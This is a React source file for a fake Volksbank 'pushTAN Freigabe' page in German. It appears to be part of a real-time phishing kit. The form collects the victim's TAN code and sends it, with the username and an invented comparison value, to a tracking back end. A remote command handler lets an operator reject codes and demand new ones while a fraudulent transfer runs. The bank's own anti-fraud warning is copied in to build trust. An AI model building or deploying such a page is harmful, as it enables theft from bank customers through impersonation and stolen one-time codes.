"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("volksbank", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main PushTAN area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>pushTAN Freigabe</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Security Teaser */}
                  <div className="securityteaser-wrapper">
                    <a
                      className="command-link"
                      href="#"
                      aria-label="Achtung: Geben Sie den TAN-Code NIEMALS an Dritte weiter. Ihre Bank wird Sie NIEMALS telefonisch nach einem TAN-Code fragen."
                    >
                      <span className="command-link-icon">
                        <div className="securityteaser-box">
                          <div className="securityteaser-content">
                            <div className="icon">
                              <span className="icon icon-caution">{"⚠"}</span>
                            </div>
                            <div className="teaser">
                              <b>Achtung: Geben Sie den TAN-Code NIEMALS an Dritte weiter!</b>
                              <br /><b><br /></b>
                              Ihre Bank wird Sie <b>NIEMALS</b> telefonisch nach einem TAN-Code fragen.
                            </div>
                          </div>
                        </div>
                      </span>
                    </a>
                  </div>

                  {/* Error banner */}
                  {error && (
                    <div className="messages-overlay">
                      <div
                        style={{
                          backgroundColor: "#fef2f2",
                          border: "1px solid #c70100",
                          borderRadius: 4,
                          padding: "12px 16px",
                          color: "#c70100",
                          fontSize: 14,
                          lineHeight: 1.5,
                        }}
                      >
                        {error}
                      </div>
                    </div>
                  )}

                  {success ? (
                    /* ---- Success message ---- */
                    <div style={{ textAlign: "center", padding: "40px 10px" }}>
                      <div
                        style={{
                          width: 64,
                          height: 64,
                          borderRadius: "50%",
                          backgroundColor: "#196bc1",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          margin: "0 auto 20px",
                        }}
                      >
                        <svg
                          width="32"
                          height="32"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="#fff"
                          strokeWidth="2.5"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        >
                          <polyline points="20 6 9 17 4 12" />
                        </svg>
                      </div>
                      <p
                        style={{
                          fontSize: 20,
                          color: "#333333",
                          marginBottom: 8,
                          fontWeight: 500,
                        }}
                      >
                        Transaktion best{"ä"}tigt
                      </p>
                      <p style={{ fontSize: 14, color: "#8c8c8c" }}>
                        Ihre Eingabe wurde erfolgreich {"ü"}bermittelt.
                      </p>
                    </div>
                  ) : (
                    <>
                      {/* Info text */}
                      <div className="row login-row login-info-text">
                        <p>
                          Best{"ä"}tigen Sie die Transaktion in Ihrer pushTAN-App.
                          Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger{"ä"}t.
                        </p>
                      </div>

                      {/* Divider */}
                      <div className="row login-row login-demo">
                        <hr className="no-margin-top" role="presentation" />
                      </div>

                      {/* Timer ring + Vergleichswert */}
                      <div className="row">
                        <div className="col-xs-12">
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: 24,
                              justifyContent: "center",
                              marginBottom: 20,
                              marginTop: 10,
                            }}
                          >
                            {/* Countdown ring */}
                            <div
                              style={{
                                position: "relative",
                                width: ringSize,
                                height: ringSize,
                                flexShrink: 0,
                              }}
                            >
                              <svg
                                width={ringSize}
                                height={ringSize}
                                style={{ transform: "rotate(-90deg)" }}
                              >
                                <circle
                                  cx={ringSize / 2}
                                  cy={ringSize / 2}
                                  r={radius}
                                  fill="none"
                                  stroke="#d7d7d7"
                                  strokeWidth={strokeWidth}
                                />
                                <circle
                                  cx={ringSize / 2}
                                  cy={ringSize / 2}
                                  r={radius}
                                  fill="none"
                                  stroke={expired ? "#c70100" : "#196bc1"}
                                  strokeWidth={strokeWidth}
                                  strokeDasharray={circumference}
                                  strokeDashoffset={dashOffset}
                                  strokeLinecap="round"
                                  style={{ transition: "stroke-dashoffset 1s linear" }}
                                />
                              </svg>
                              <div
                                style={{
                                  position: "absolute",
                                  top: 0,
                                  left: 0,
                                  width: "100%",
                                  height: "100%",
                                  display: "flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  fontSize: 16,
                                  fontWeight: 500,
                                  color: expired ? "#c70100" : "#333333",
                                }}
                              >
                                {formatTime(secondsLeft)}
                              </div>
                            </div>

                            {/* Vergleichswert */}
                            <div>
                              <p
                                style={{
                                  fontSize: 13,
                                  color: "#8c8c8c",
                                  marginBottom: 6,
                                  textTransform: "uppercase",
                                  letterSpacing: "0.05em",
                                }}
                              >
                                Vergleichswert
                              </p>
                              <p
                                style={{
                                  fontSize: 32,
                                  fontWeight: 400,
                                  color: "#196bc1",
                                  letterSpacing: "0.15em",
                                  lineHeight: 1,
                                  margin: 0,
                                }}
                              >
                                {vergleichswert}
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Code input */}
                      <div className="row">
                        <div className="col-xs-12">
                          <label htmlFor="tan-code">
                            <small>TAN-Code eingeben</small>
                          </label>
                          <div className="input-text">
                            <input
                              id="tan-code"
                              type="text"
                              className="form-control"
                              placeholder=""
                              value={code}
                              onChange={(e) =>
                                setCode(
                                  e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6)
                                )
                              }
                              maxLength={6}
                              disabled={expired}
                              autoComplete="one-time-code"
                              inputMode="text"
                              spellCheck={false}
                              style={expired ? { opacity: 0.5 } : {}}
                            />
                            <a
                              className="del-btn"
                              tabIndex={-1}
                              onClick={() => setCode("")}
                              style={{ display: code ? "block" : "none" }}
                            >
                              <span className="icon icon-inhalt-loeschen">{"✕"}</span>
                            </a>
                          </div>
                        </div>
                      </div>

                      {/* Expired warning */}
                      {expired && (
                        <div className="row login-nutzungsbedingungen">
                          <p style={{ color: "#c70100" }}>
                            Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                          </p>
                        </div>
                      )}
                    </>
                  )}
                </div>

                {/* Submit button footer */}
                {!success && (
                  <div className="modal-footer">
                    <div className="row">
                      <button
                        type="submit"
                        className="button-default pull-right button-fullwidth"
                        disabled={!isValid || submitting}
                        aria-label="TAN best{'ä'}tigen"
                      >
                        {submitting ? "Wird geprüft..." : "Bestätigen"}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
